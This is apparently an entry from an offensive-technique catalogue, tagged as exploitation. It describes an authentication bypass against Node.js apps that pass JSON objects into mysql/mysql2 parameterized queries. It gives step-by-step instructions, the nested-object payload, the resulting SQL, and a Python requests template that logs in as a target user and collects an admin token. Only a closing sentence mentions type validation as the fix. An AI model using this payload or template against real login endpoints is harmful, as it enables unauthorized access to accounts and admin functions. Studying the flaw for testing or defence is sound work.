---
name: mysql_object_injection_auth_bypass
vuln_type: sqli
sub_technique: object_injection
category: exploitation
safety_level: safe
tags:
- mysql
- object-injection
- auth-bypass
- type-confusion
- nodejs
---

# Mysql Object Injection Auth Bypass — Json Object As Parameterized Query Value

## When to Apply

A Node.js app uses mysql/mysql2 driver with parameterized queries but does not validate the type of user input (req.body.password, etc.), allowing JSON objects to be passed directly. With Express's express.json() middleware enabled, nested objects like { "password": { "password": 1 } } are parsed as-is.

## Prerequisites

- Node.js + mysql/mysql2 driver in use
- express.json() middleware enabled (Content-Type: application/json)
- User input passed to parameterized query without type validation
- Query like SELECT * FROM users WHERE username = ? AND password = ?

## Steps

1. Identify target login endpoint: `POST /auth/login` + `Content-Type: application/json`
2. Pass object in password field: `{"username": "admin", "password": {"password": 1}}`
3. mysql2 driver serializes the object to `` `password` = 1 ``
4. Final SQL: `WHERE username = 'admin' AND password = \`password\` = 1`
5. `password = \`password\`` → column compared to itself → always 1 (true)
6. `1 = 1` → true → authentication bypass successful

## Code Template

```
import requests
r = requests.post('{url}/auth/login',
    json={'username': '{target_user}', 'password': {'password': 1}})
token = r.json().get('token')
# use token to access admin functionality
```

## Examples

### Example 1

- **driver**: mysql2
- **query**: SELECT * FROM users WHERE username = ? AND password = ?
- **payload**: {"username": "admin", "password": {"password": 1}}

mysql2 driver serializes objects to `col = val` form. password = `password` = 1 becomes (password = password) = 1 → 1 = 1 → true. This technique bypasses even parameterized queries, so typeof validation or input schema validation is essential.
